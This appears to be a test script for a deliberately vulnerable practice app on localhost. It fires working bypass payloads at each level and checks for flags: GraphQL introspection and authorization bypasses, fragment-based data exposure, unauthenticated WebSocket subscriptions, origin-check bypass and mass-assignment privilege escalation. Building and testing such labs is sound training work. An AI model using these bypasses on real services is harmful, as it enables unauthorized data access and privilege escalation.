const http = require("http");
const WebSocket = require("ws");

function httpReq(method, path, { cookies = "", body, headers = {} } = {}) {
  return new Promise((resolve, reject) => {
    const data = body ? JSON.stringify(body) : null;
    const opts = { host: "localhost", port: 3000, path, method, headers: Object.assign({}, headers, cookies ? { Cookie: cookies } : {}, data ? { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } : {}) };
    const r = http.request(opts, (res) => { let c = []; res.on("data", (d) => c.push(d)); res.on("end", () => resolve({ status: res.statusCode, body: Buffer.concat(c).toString(), setCookie: res.headers["set-cookie"] || [], json: () => { try { return JSON.parse(Buffer.concat(c).toString()); } catch (e) { return null; } } })); });
    r.setTimeout(4000, () => r.destroy(new Error("timeout: " + method + " " + path)));
    r.on("error", reject);
    if (data) r.write(data);
    r.end();
  });
}
function cookieStr(setCookieArr, existing) {
  const jar = {};
  (existing || "").split(";").forEach((p) => { const [k, v] = p.trim().split("="); if (k) jar[k] = v; });
  (setCookieArr || []).forEach((sc) => { const [kv] = sc.split(";"); const [k, v] = kv.split("="); jar[k] = v; });
  return Object.entries(jar).filter(([k]) => k).map(([k, v]) => `${k}=${v}`).join("; ");
}
async function graphqlQuery(query, difficulty, cookies) {
  const r = await httpReq("POST", `/graphql?difficulty=${difficulty}`, { cookies, body: { query } });
  return r.json();
}
function wsCollect(url, headers, sendAfterOpen, timeoutMs = 1500) {
  return new Promise((resolve) => {
    const messages = [];
    let closedInfo = null;
    const ws = new WebSocket(url, { headers });
    ws.on("open", () => { if (sendAfterOpen) ws.send(JSON.stringify(sendAfterOpen)); });
    ws.on("message", (raw) => { try { messages.push(JSON.parse(raw)); } catch (e) {} });
    ws.on("close", (code, reason) => { closedInfo = { code, reason: reason.toString() }; });
    ws.on("error", () => {});
    setTimeout(() => { try { ws.close(); } catch (e) {} resolve({ messages, closedInfo }); }, timeoutMs);
  });
}

let pass = 0, fail = 0;
function check(name, cond, extra) { if (cond) { pass++; console.log("PASS:", name); } else { fail++; console.log("FAIL:", name, extra || ""); } }
setTimeout(() => { console.log(`DEADLINE HIT: ${pass} passed, ${fail} failed (incomplete)`); process.exit(2); }, 45000).unref();

function hasFlag(obj) { return JSON.stringify(obj).includes("FLAG{"); }

async function run() {
  // ============================= graphql-introspection =============================
  let r1 = await graphqlQuery("{ __schema { types { name fields { name } } } }", "easy");
  check("graphql-introspection easy: __schema works, reveals internalDebugNotes", JSON.stringify(r1).includes("internalDebugNotes") && hasFlag(r1));

  let r2 = await graphqlQuery("{ __schema { types { name } } }", "medium");
  check("graphql-introspection medium: __schema blocked", !!(r2.errors && /disabled/i.test(r2.errors[0].message)));
  let r3 = await graphqlQuery('{ __type(name: "User") { fields { name } } }', "medium");
  check("graphql-introspection medium: __type bypass works", JSON.stringify(r3).includes("internalDebugNotes") && hasFlag(r3));

  let r4 = await graphqlQuery('{ __type(name: "User") { fields { name } } }', "hard");
  check("graphql-introspection hard: __type blocked too", !!(r4.errors && r4.errors.length) && !hasFlag(r4));
  let r5 = await graphqlQuery("{ user(id: 1) { internalDebugNote } }", "hard"); // deliberate misspelling
  check("graphql-introspection hard: 'Did you mean' schema leak -> flag", hasFlag(r5), JSON.stringify(r5));

  // ============================= graphql-authz-bypass =============================
  let r6a = await httpReq("GET", "/vuln/graphql-authz-bypass?difficulty=easy"); // establish a session
  let c6 = cookieStr(r6a.setCookie, "");
  let r6 = await graphqlQuery("{ user(id: 100) { username ssn } }", "easy", c6); // 100 = admin, never my own random id
  check("graphql-authz-bypass easy: user(id) BOLA -> flag", hasFlag(r6), JSON.stringify(r6));

  let r7a = await httpReq("GET", "/vuln/graphql-authz-bypass?difficulty=medium");
  let c7 = cookieStr(r7a.setCookie, "");
  let r7 = await graphqlQuery("{ user(id: 100) { username ssn } }", "medium", c7);
  check("graphql-authz-bypass medium: user(id) now checked -> NO flag", !hasFlag(r7), JSON.stringify(r7));
  let r8 = await graphqlQuery("{ userProfile(id: 100) { username ssn } }", "medium", c7);
  check("graphql-authz-bypass medium: userProfile(id) bypass -> flag", hasFlag(r8));

  let r9a = await httpReq("GET", "/vuln/graphql-authz-bypass?difficulty=hard");
  let c9 = cookieStr(r9a.setCookie, "");
  let r9 = await graphqlQuery("{ userProfile(id: 100) { username ssn } }", "hard", c9);
  check("graphql-authz-bypass hard: userProfile(id) now checked -> NO flag", !hasFlag(r9));
  let r10 = await graphqlQuery("{ node(id: 100) { username ssn } }", "hard", c9);
  check("graphql-authz-bypass hard: node(id) generic-lookup bypass -> flag", hasFlag(r10));

  // ============================= graphql-excessive-exposure =============================
  let r11 = await graphqlQuery("{ users { username ssn passwordHash apiKey } }", "easy");
  check("graphql-excessive-exposure easy: direct sensitive fields on list -> flag", hasFlag(r11));

  let r12 = await graphqlQuery("{ users { username ssn } }", "medium");
  check("graphql-excessive-exposure medium: direct field blocked", !!(r12.errors && r12.errors.length) && !hasFlag(r12));
  let r13 = await graphqlQuery("fragment F on User { ssn passwordHash apiKey }\n{ users { username ...F } }", "medium");
  check("graphql-excessive-exposure medium: fragment bypass -> flag", hasFlag(r13), JSON.stringify(r13));

  let r14 = await graphqlQuery("fragment F on User { ssn passwordHash apiKey }\n{ users { username ...F } }", "hard");
  check("graphql-excessive-exposure hard: fragment bypass now blocked (real AST check)", !hasFlag(r14) && !!(r14.errors && r14.errors.length));
  let r15 = await graphqlQuery("{ node(id: 1) { username ssn passwordHash apiKey } }", "hard");
  check("graphql-excessive-exposure hard: node() bypass -> flag", hasFlag(r15), JSON.stringify(r15));

  // ============================= websocket-no-auth =============================
  async function getWsCookie(difficulty) {
    const r = await httpReq("GET", `/vuln/websocket-no-auth?difficulty=${difficulty}`);
    return cookieStr(r.setCookie, "");
  }
  let wsCookieEasy = await getWsCookie("easy");
  let wr1 = await wsCollect("ws://localhost:3000/ws/notifications?difficulty=easy", { Cookie: wsCookieEasy }, { type: "subscribe", targetUserId: 999 });
  check("websocket-no-auth easy: subscribe to anyone, zero checks -> flag", hasFlag(wr1.messages), JSON.stringify(wr1.messages));

  let wr1b = await wsCollect("ws://localhost:3000/ws/notifications?difficulty=easy", {}, { type: "subscribe", targetUserId: 999 }); // literally zero cookies
  check("websocket-no-auth easy: connects with NO cookie at all (no auth required)", wr1b.messages.length > 0 && !wr1b.closedInfo, JSON.stringify(wr1b));

  let wsCookieMed = await getWsCookie("medium");
  let wr2 = await wsCollect("ws://localhost:3000/ws/notifications?difficulty=medium", {}, { type: "subscribe", targetUserId: 999 });
  check("websocket-no-auth medium: no cookie -> rejected", !!wr2.closedInfo && wr2.closedInfo.code === 4001, JSON.stringify(wr2.closedInfo));
  let wr3 = await wsCollect("ws://localhost:3000/ws/notifications?difficulty=medium", { Cookie: wsCookieMed }, { type: "subscribe", targetUserId: 999 });
  check("websocket-no-auth medium: valid cookie but unchecked subscribe target -> flag", hasFlag(wr3.messages));

  let wsCookieHard = await getWsCookie("hard");
  let wr4 = await wsCollect("ws://localhost:3000/ws/notifications?difficulty=hard", { Cookie: wsCookieHard }, { type: "subscribe", targetUserId: 999 });
  check("websocket-no-auth hard: subscribe target now checked -> NO flag, error returned", !hasFlag(wr4.messages) && wr4.messages.some((m) => m.type === "error"));
  let wr5 = await wsCollect("ws://localhost:3000/ws/notifications?difficulty=hard", { Cookie: wsCookieHard }, { type: "admin-broadcast", message: "unauthorized alert" });
  check("websocket-no-auth hard: admin-broadcast message type unchecked -> flag", hasFlag(wr5.messages), JSON.stringify(wr5.messages));

  // ============================= websocket-origin-validation =============================
  let r16 = await httpReq("POST", "/vuln/websocket-origin-validation/probe?difficulty=easy", { body: { simOrigin: "https://evil-attacker.test" } });
  check("websocket-origin-validation easy: any origin accepted -> flag", r16.json().accepted && hasFlag(r16.json()), JSON.stringify(r16.json()));

  let r17 = await httpReq("POST", "/vuln/websocket-origin-validation/probe?difficulty=medium", { body: { simOrigin: "https://evil-attacker.test" } });
  check("websocket-origin-validation medium: unrelated origin rejected", !r17.json().accepted, JSON.stringify(r17.json()));
  let r18 = await httpReq("POST", "/vuln/websocket-origin-validation/probe?difficulty=medium", { body: { simOrigin: "https://securecorp-demo.test.evil-attacker.test" } });
  check("websocket-origin-validation medium: substring bypass -> flag", r18.json().accepted && hasFlag(r18.json()), JSON.stringify(r18.json()));

  let r19 = await httpReq("POST", "/vuln/websocket-origin-validation/probe?difficulty=hard", { body: { simOrigin: "https://securecorp-demo.test.evil-attacker.test" } });
  check("websocket-origin-validation hard: substring bypass fixed", !r19.json().accepted, JSON.stringify(r19.json()));
  let r20 = await httpReq("POST", "/vuln/websocket-origin-validation/probe?difficulty=hard", { body: { simOrigin: "https://evil-attacker.test", legacy: true } });
  check("websocket-origin-validation hard: legacy path bypass -> flag", r20.json().accepted && hasFlag(r20.json()), JSON.stringify(r20.json()));

  // ============================= api-mass-assignment =============================
  let r21 = await httpReq("PATCH", "/vuln/api-mass-assignment/profile?difficulty=easy", { body: { role: "admin" } });
  check("api-mass-assignment easy: direct role field -> flag", hasFlag(r21.json()), JSON.stringify(r21.json()));

  let c22 = cookieStr((await httpReq("GET", "/vuln/api-mass-assignment?difficulty=medium")).setCookie, "");
  let r22 = await httpReq("PATCH", "/vuln/api-mass-assignment/profile?difficulty=medium", { cookies: c22, body: { role: "admin" } });
  check("api-mass-assignment medium: allowlisted endpoint blocks role", !hasFlag(r22.json()) && r22.json().profile.role !== "admin", JSON.stringify(r22.json()));
  let r23 = await httpReq("POST", "/vuln/api-mass-assignment/import?difficulty=medium", { cookies: c22, body: { role: "admin" } });
  check("api-mass-assignment medium: bulk-import endpoint has no allowlist -> flag", hasFlag(r23.json()), JSON.stringify(r23.json()));

  let c24 = cookieStr((await httpReq("GET", "/vuln/api-mass-assignment?difficulty=hard")).setCookie, "");
  let r24 = await httpReq("PATCH", "/vuln/api-mass-assignment/profile?difficulty=hard", { cookies: c24, body: { role: "admin" } });
  check("api-mass-assignment hard: exact-case role blocked", !hasFlag(r24.json()) && r24.json().profile.role !== "admin", JSON.stringify(r24.json()));
  let r25 = await httpReq("PATCH", "/vuln/api-mass-assignment/profile?difficulty=hard", { cookies: c24, body: { Role: "admin" } });
  check("api-mass-assignment hard: differently-cased Role bypasses -> flag", hasFlag(r25.json()), JSON.stringify(r25.json()));

  console.log(`\n=== ${pass} passed, ${fail} failed ===`);
  process.exit(fail > 0 ? 1 : 0);
}
run().catch((e) => { console.error("ERROR:", e); process.exit(1); });
